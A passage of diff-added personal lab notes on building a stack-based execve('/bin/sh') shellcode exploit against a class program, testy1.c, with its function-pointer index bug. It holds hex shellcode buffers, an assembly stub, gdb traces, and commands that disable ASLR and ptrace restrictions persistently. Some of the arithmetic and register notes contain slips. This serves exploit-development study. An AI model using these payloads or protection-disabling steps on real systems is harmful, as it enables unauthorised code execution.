+       s390x      svc 0                r1          r2     See below
+       sparc/32   t 0x10               g1          o0
+       sparc/64   t 0x6d               g1          o0
+       x86_64     syscall              rax         rax    See below
+       x32        syscall              rax         rax    See below
+
+It shows the syscall is in eax register when the software interrupt hex
+80 is hit.
+
+
+Returning to the guide, the author abandons the assembly code he got 
+from the disassembly and replaces it with some assembly.  In this assembly
+he uses the syscall with a parm of 0x3b.  On my host pc which is x86_64
+I have
+#define __NR_execve 59
+
+which is (64-5 or 100 0000-5 or 0x40-5 or 0x3b) which is the syscall on x86_64.
+So this jives with what is expected.
+
+However, in the essence of time I'm going to do the same thing as him and that
+is use his asm source as a starting point.
+
+# shell.asm
+        global _start
+
+_start:
+        mov rdx, 0
+        mov rsi, 0
+        lea rdi, [rel buf]
+        mov rax, 0x3b
+        syscall
+
+buf:    db '/bin/sh', 0
+
+Note, we know fir x86 we push our parms on stack so it will still need to 
+be swizzled.
+
+############################################################
+
+testy1.c notes
+
+This is code I had for a class.  The assignment was to simply 
+invoke the secret function.  Here is a method for getting a shell.
+Since this code uses a function pointer its easier to exploit
+than our target example.  We will use it to show a few things
+before we resume working with that program.
+
+dbit.sh and runbin.sh are used with testy1.c.  Edit the .gdbinit file to change
+options for use with this program as well.
+
+I was having problems attaching to the process in my vm.  It appears newer 
+kernels/distros do not permit gdb attachment to process's. Do this to enable 
+attachment:
+
+As root:
+echo 0 > /proc/sys/kernel/yama/ptrace_scope
+…or make it permanent by setting ptrace_scope to 0 in /etc/sysctl.d/10-ptrace.conf
+
+ASIDE:
+I was using this to see if I had the wrong pid.
+pstree -l -s -p somepid#
+
+List breakpoints in gdb using 
+(gdb) info break
+
+Clear breakpoint with
+(gdb) clear <bp line number>
+Without a number it clears the bp on the current line.
+
+This was the exploit buffer used for the class assignment.  I'm reusing it as a starting point.
+However, this line will not work on this system.  Its a newer kernel, gcc, glibc, etc.
+Not a problem though.
+
+Here is the buffer entered at the selection prompt for select>
+
+771675175\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+set break after read at line 107 or step using next.
+
+
+Since the code is run inside a script it will interpe the  slash commands as hex codes.
+This code uses read() so it will read nulls.  The first number is an index into a pointer array
+which it will call.  ie. if you submit 1, it will call function 1 in the array.  So, we are submitting
+an index which is way the fsck out of bounds.  How did this number get calculated?
+
+Look at the stack pointer, (which is the same as buf since its the first specified local variable)
+(gdb) x/x $esp
+0xbfbe13e0:     0x36313737
+
+Look at the function pointer.
+(gdb) x/x ptrs
+0x80ec480 <ptrs>:       0x00000000
+(gdb) print ptrs
+$2 =   {[0] = 0x0,
+  [1] = 0x80488ee <get_wisdom at testy1.c:41>,
+  [2] = 0x804898e <put_wisdom at testy1.c:56>}
+(gdb) 
+
+Some math:
+esp     0xbfbe 13e0
+ptrs  - 0x080e c480
+-------------------
+        0xb7af 4f60
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7af 4f60
+  div by          4
+-------------------
+        0x2deb d3d8
+
+Convert to decimal
+770,429,912
+
+This will cause a function to invoked at the top of the stack.  However, our code is not 
+at the top of the stack its a little bit further down. ie. buf is a stack variable which is
+at the top of the stack, but the shell code is not at the start of the buf.  The index to the 
+function pointer is the first few bytes.
+
+<do this one over>
+(gdb) x/4x buf
+0xbfbe13e0:     0x36313737      0x37313537      0x00000035      0x41414141
+(gdb) x/4x $esp
+0xbfbe13e0:     0x36313737      0x37313537      0x00000035      0x41414141
+
+
+
+Look at the portions of buf we supplied.
+<do this one over>
+
+(gdb) x/20xw buf
+0xbfbe13e0:     0x36313737      0x37313537      0x00000035      0x41414141
+0xbfbe13f0:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbfbe1400:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbfbe1410:     0x0000000b      0x414180cd      0x41414141      0x41414141
+0xbfbe1420:     0xbffff150      0x0000000a      0x00000000      0x00000000
+(gdb) 
+
+We supplied some A's at two points.  Towards the start and near the end.
+
+(gdb) x/20s buf
+0xbfbe13e0:     "771675175"   <-- this index is not 770,429,912
+0xbfbe13ea:     ""
+0xbfbe13eb:     ""
+0xbfbe13ec:     "AAAA/bin/sh"
+0xbfbe13f8:     "@\361\377\277"
+0xbfbe13fd:     ""
+0xbfbe13fe:     ""
+0xbfbe13ff:     ""
+0xbfbe1400:     "\273@\361\377\277\271H\361\377\277\272"  <-- its supposed to be here
+0xbfbe140c:     ""                                            see below for more info
+0xbfbe140d:     ""
+0xbfbe140e:     ""
+0xbfbe140f:     "\270\v"
+0xbfbe13ff:     ""
+0xbfbe1400:     "\273@\361\377\277\271H\361\377\277\272"
+0xbfbe140c:     ""
+0xbfbe140d:     ""
+0xbfbe140e:     ""
+0xbfbe140f:     "\270\v"
+0xbfbe1412:     ""
+0xbfbe1413:     ""
+0xbfbe1414:     "̀AAAAAAAAAAP\361\377\277\n"
+0xbfbe1426:     ""
+0xbfbe1427:     ""
+0xbfbe1428:     ""
+0xbfbe1429:     ""
+
+
+Using those as markers, lets disass some code.
+
+ASIDE:
+disas in gdb works a little weird for raw addresses.
+(gdb) disas foo
+will disas the function foo
+
+(gdb) disas 0x1234
+will give an error because it thinks the address is a function which does not exist.
+Instead use a comma and give a count of how many bytes to disassemble.
+(Well this is not entirely accurate.  On some gdb versions it uses a comma and others
+it does not.  The ones which do not use a comma do not take a count.  They require
+an absolute ending address. :-/ Depending upon your version you do either of these forms.
+
+(gdb) disas 0xbfbe1400, +30
+or
+(gdb) disas 0xbfbe1400 0xbfbe1410
+
+Also, try using with a /r syntax so it will give opcodes.
+(gdb) disas 0xbfbe1400, +22
+Dump of assembler code from 0xbfbe1400 to 0xbfbe1416:
+   0xbfbe1400:  mov    $0xbffff140,%ebx
+   0xbfbe1405:  mov    $0xbffff148,%ecx
+   0xbfbe140a:  mov    $0x0,%edx
+   0xbfbe140f:  mov    $0xb,%eax
+   0xbfbe1414:  int    $0x80
+End of assembler dump.
+
+(gdb) disas /r 0xbfbe1400, +22
+Dump of assembler code from 0xbfbe1400 to 0xbfbe1416:
+   0xbfbe1400:  bb 40 f1 ff bf  mov    $0xbffff140,%ebx
+   0xbfbe1405:  b9 48 f1 ff bf  mov    $0xbffff148,%ecx
+   0xbfbe140a:  ba 00 00 00 00  mov    $0x0,%edx
+   0xbfbe140f:  b8 0b 00 00 00  mov    $0xb,%eax
+   0xbfbe1414:  cd 80   int    $0x80
+End of assembler dump.
+(gdb) 
+
+
+Above is the code we want to execute.  I'll explain that in a bit.  Let's fix up the address
+jump addresses first.
+
+
+Some math:
+start of code     0xbfbe 1400
+ptrs            - 0x080e c480
+-----------------------------
+                  0xb7af 4f80
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7af 4f80
+  div by          4
+-------------------
+        0x2deb d3e0
+
+Convert to decimal
+770,429,920
+
+So our new exploit buffer is
+
+770429920\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+
+Gott verdammt.  I forgot to turn off ASLR.  I did a restart and look at what it did.
+
+(gdb) x/16xw buf
+0xbff905e0:     0x34303737      0x32393932      0x00000030      0x41414141
+0xbff905f0:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbff90600:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbff90610:     0x0000000b      0x414180cd      0x41414141      0x41414141
+(gdb) quit
+A debugging session is active.
+
+
+ok. Here is your quick look at ASLR. 
+
+# cat /proc/sys/kernel/randomize_va_space
+
+0 – Radomization is off.
+1 – Patial radomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
+2 – Full randomization. Same as above but changing end of data segment with brk() and sbrk() is
+also randomized.
+
+Turn it off at runtime.
+# echo 0 > /proc/sys/kernel/randomize_va_space
+
+Turn it off at boot.
+# cat /etc/sysctl.d/01-disable-aslr.conf 
+kernel.randomize_va_space = 0
+
+Ok. One more time.
+In one terminal, ./runbin.sh to start the program with the looper to interpet hex escape codes.
+In another terminal, ./gdbit.sh to attach gdb.  Type cont to continue and then back to the first 
+terminal to paste in the exploit text.  Switch back to the debugger and we resume.
+
+
+
+(gdb) x/16xw buf
+0xbfbe7f10:     0x34303737      0x32393932      0x00000030      0x41414141
+0xbfbe7f20:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbfbe7f30:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbfbe7f40:     0x0000000b      0x414180cd      0x41414141      0x41414141
+
+(gdb) x/10s buf
+0xbfbe7f10:     "770429920"
+0xbfbe7f1a:     ""
+0xbfbe7f1b:     ""
+0xbfbe7f1c:     "AAAA/bin/sh"
+0xbfbe7f28:     "@\361\377\277"
+0xbfbe7f2d:     ""
+0xbfbe7f2e:     ""
+0xbfbe7f2f:     ""
+0xbfbe7f30:     "\273@\361\377\277\271H\361\377\277\272"
+0xbfbe7f3c:     ""
+
+(gdb) disas 0xbfbe7f30, +22
+Dump of assembler code from 0xbfbe7f30 to 0xbfbe7f46:
+   0xbfbe7f30:  mov    $0xbffff140,%ebx
+   0xbfbe7f35:  mov    $0xbffff148,%ecx
+   0xbfbe7f3a:  mov    $0x0,%edx
+   0xbfbe7f3f:  mov    $0xb,%eax
+   0xbfbe7f44:  int    $0x80
+End of assembler dump.
+(gdb) 
+
+(gdb) x/10wx ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+0x80ec670 <_nl_current_default_domain>: 0x080bca20      0x080ed8a0      0x00000000      0x00000000
+0x80ec680 <_IO_list_all>:       0x080ec6a0      0x00000000
+
+
+Same process as before
+
+Some math:
+start of code     0xbfbe 7f30
+ptrs            - 0x080e c660
+-----------------------------
+                  0xb7af 68d0
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7af 68d0
+  div by          4
+-------------------
+        0x2deb ee34
+
+Convert to decimal
+770,436,660
+
+So our new exploit buffer is
+
+770436660\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+
+Restart, lets see this time we should be able to step to the function pointer.  The code which we step
+to will still be wrong, but one step at a time.
+
+ach du lieber gott
+It did it again.  And 
+[root@vm-i386 ~]# cat /etc/sysctl.d/01-disable-aslr.conf
+kernel.randomize_va_space = 0
+
+is back.
+
+So here is the fix.  Archlinux uses sysctl
+
+Show your current settings.
+
+# sysctn -a | grep randomize
+kernel.randomize_va_space = 2
+
+Try turning it off and look again at sysctl settings.
+[root@vm-i386 ~]# cat /proc/sys/kernel/randomize_va_space 
+2
+[root@vm-i386 ~]# echo 0 >  /proc/sys/kernel/randomize_va_space 
+[root@vm-i386 ~]# cat /proc/sys/kernel/randomize_va_space 
+0
+[root@vm-i386 ~]# sysctl -a | grep randomize
+kernel.randomize_va_space = 0
+sysctl: reading key "net.ipv6.conf.all.stable_secret"
+sysctl: reading key "net.ipv6.conf.default.stable_secret"
+sysctl: reading key "net.ipv6.conf.ens3.stable_secret"
+sysctl: reading key "net.ipv6.conf.lo.stable_secret"
+[root@vm-i386 ~]# 
+
+Hmm, its not in here:
+cat /usr/lib/sysctl.d/50-default.conf | grep randomize
+
+Nor here:
+cat /lib/sysctl.d/50-default.conf  | grep randomize
+
+And then to stick changes, make sure it shows the config files being called
+use sysctl --system
+
+Once again here I set them to non hacking friendly, restart the sysctl with
+the config files and then see that the values are back to friendly.
+
+[root@vm-i386 ~]# echo 1 > /proc/sys/kernel/yama/ptrace_scope 
+[root@vm-i386 ~]# echo 1 > /proc/sys/kernel/randomize_va_space 
+[root@vm-i386 ~]# sysctl --system
+* Applying /etc/sysctl.d/01-disable-aslr.conf ...
+kernel.randomize_va_space = 0
+* Applying /etc/sysctl.d/10-ptrace.conf ...
+kernel.yama.ptrace_scope = 0
+* Applying /usr/lib/sysctl.d/50-coredump.conf ...
+kernel.core_pattern = |/usr/lib/systemd/systemd-coredump %P %u %g %s %t %e
+* Applying /usr/lib/sysctl.d/50-default.conf ...
+kernel.sysrq = 16
+kernel.core_uses_pid = 1
+net.ipv4.conf.default.rp_filter = 1
+net.ipv4.conf.all.rp_filter = 1
+net.ipv4.conf.default.accept_source_route = 0
+net.ipv4.conf.all.accept_source_route = 0
+net.ipv4.conf.default.promote_secondaries = 1
+net.ipv4.conf.all.promote_secondaries = 1
+net.core.default_qdisc = fq_codel
+fs.protected_hardlinks = 1
+fs.protected_symlinks = 1
+[root@vm-i386 ~]# cat /proc/sys/kernel/yama/ptrace_scope 
+0
+[root@vm-i386 ~]# cat /proc/sys/kernel/randomize_va_space 
+0
+
+And finally for completion sake:
+
+[root@vm-i386 ~]# cat /etc/sysctl.d/10-ptrace.conf 
+kernel.yama.ptrace_scope=0
+[root@vm-i386 ~]# cat /etc/sysctl.d/01-disable-aslr.conf 
+kernel.randomize_va_space = 0
+
+
+Ok, one more time
+
+(gdb) x/16xw buf
+0xbffff330:     0x34303737      0x36363633      0x00000030      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbffff350:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbffff360:     0x0000000b      0x414180cd      0x41414141      0x41414141
+
+(gdb) x/10s buf
+0xbffff330:     "770436660"
+0xbffff33a:     ""
+0xbffff33b:     ""
+0xbffff33c:     "AAAA/bin/sh"
+0xbffff348:     "@\361\377\277"
+0xbffff34d:     ""
+0xbffff34e:     ""
+0xbffff34f:     ""
+0xbffff350:     "\273@\361\377\277\271H\361\377\277\272"
+0xbffff35c:     ""
+(gdb) 
+
+(gdb) disas 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff140,%ebx
+   0xbffff355:  mov    $0xbffff148,%ecx
+   0xbffff35a:  mov    $0x0,%edx
+   0xbffff35f:  mov    $0xb,%eax
+   0xbffff364:  int    $0x80
+End of assembler dump.
+(gdb) 
+
+(gdb) x/10wx ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+0x80ec670 <_nl_current_default_domain>: 0x080bca20      0x080ed8a0      0x00000000      0x00000000
+0x80ec680 <_IO_list_all>:       0x080ec6a0      0x00000000
+(gdb) 
+
+
+
+Some math:
+start of code     0xbfff f350
+ptrs            - 0x080e c660
+-----------------------------
+                  0xb7f1 2cf0
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7f1 c660
+  div by          4
+-------------------
+        0x2dfc 4b3c
+
+Convert to decimal
+771,509,052
+
+So our new exploit buffer is
+
+
+
+771509052\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+Ok Good.  The function pointer is setup to call a routine at 0xbffff350
+which is the first instruction of our shell code.
+(gdb) print ptrs[s]
+$4 = (fptr) 0xfff140bb
+
+and
+
+(gdb) x/16xw buf
+0xbffff330:     0x35313737      0x35303930      0x00000032      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbffff350:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+
+Rewrite this instruction to be something else for grins.
+
+(gdb) set var ptrs[s] = main
+(gdb) print ptrs[s] 
+$5 = (fptr) 0x8048a7c <main at testy1.c:96>
+(gdb) x/16xw buf   
+0xbffff330:     0x35313737      0x35303930      0x00000032      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbffff350:     0x08048a7c      0xf148b9bf      0x00babfff      0xb8000000
+0xbffff360:     0x0000000b      0x414180cd      0x41414141      0x41414141
+
+How to do a system call on linux.  
+$man syscall 
+$man execve
+Here are the important parts for us.
+
+       arch/ABI   instruction          syscall #   retval Notes
+       ───────────────────────────────────────────────────────────────────
+       i386       int $0x80            eax         eax
+
+
+      The second table shows the registers used to pass the system call argu‐
+       ments.
+
+       arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
+       ──────────────────────────────────────────────────────────────────
+       i386          ebx   ecx   edx   esi   edi   ebp   -
+
+
+      int execve(const char *path, char *const argv[], char *const envp[]);
+
+and for the syscall number for exec
+
+[davis@vm-i386 proc]$ grep exec /usr/include/asm/unistd_32.h 
+#define __NR_execve 11 
+which is 0xb
+
+So, to do the execve we need
+
+eax = syscall number, 0x3b for execve
+ebx = path, "/bin/sh"
+ecx = argv, which is a pointer to our path
+edx = null
+
+Ok, on our setup "/bin/sh" is not at address 0xbffff140.  Its at 0xbffff340
+(gdb) x/4s 0xbffff340
+0xbffff340:     "/bin/sh"
+0xbffff348:     "@\361\377\277"
+
+
+
+Breaking this into managble pieces
+771509052\x00 our function pointer index
+
+\x00\x00AAAA  our space for byte alignment and marker
+
+
+\x2f\x62\x69\x6e\x2f\x73\x68\x00  our "\bin\sh"
+
+
+\x40\xf1\xff\xbf\x00  our pointer to address above.  This needs to be 40f3 instead of 40f1
+
+
+\x00\x00\x00
+
+\xbb\x40\xf1\xff\xbf our first move instruction to load ebx
+
+\xb9\x48\xf1\xff\xbf our second move instruction to load ecx
+
+\xba\x00\x00\x00\x00 our third move instruction to load edx
+
+
+\xb8\x0b\x00\x00\x00 our fourth move instruction to load eax with syscall number 11 for execve
+
+
+\xcd\x80 our int80 to do syscall.
+
+
+AAAAAAAAAA  marker
+
+
+\x50\xf1\xff\xbf our 
+
+
+771509060\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf3\xff\xbf\x00\x00\x00\x00\xbb\x40\xf3\xff\xbf\xb9\x48\xf3\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf3\xff\xbf
+
+
+Our final result after fixes is:
+(gdb) disas /r 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
+   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
+   0xbffff35a:  ba 00 00 00 00  mov    $0x0,%edx
+   0xbffff35f:  b8 0b 00 00 00  mov    $0xb,%eax
+   0xbffff364:  cd 80   int    $0x80
+End of assembler dump.
+
+
+
+(gdb) x/10s buf
+0xbffff330:     "771509052"
+0xbffff33a:     ""
+0xbffff33b:     ""
+0xbffff33c:     "AAAA/bin/sh"
+0xbffff348:     "@\363\377\277"
+0xbffff34d:     ""
+0xbffff34e:     ""
+0xbffff34f:     ""
+0xbffff350:     "\273@\363\377\277\271H\363\377\277\272"
+0xbffff35c:     ""
+
+
+(gdb) x/80x buf
+0xbffff330:     0x37    0x37    0x31    0x35    0x30    0x39    0x30    0x35
+0xbffff338:     0x32    0x00    0x00    0x00    0x41    0x41    0x41    0x41
+0xbffff340:     0x2f    0x62    0x69    0x6e    0x2f    0x73    0x68    0x00
+0xbffff348:     0x40    0xf3    0xff    0xbf    0x00    0x00    0x00    0x00
+0xbffff350:     0xbb    0x40    0xf3    0xff    0xbf    0xb9    0x48    0xf3
+0xbffff358:     0xff    0xbf    0xba    0x00    0x00    0x00    0x00    0xb8
+0xbffff360:     0x0b    0x00    0x00    0x00    0xcd    0x80    0x41    0x41
+0xbffff368:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff370:     0x50    0xf1    0xff    0xbf    0x0a    0x00    0x00    0x00
+0xbffff378:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+
+If it helps, print out this byte dump and circle the various pieces.
+
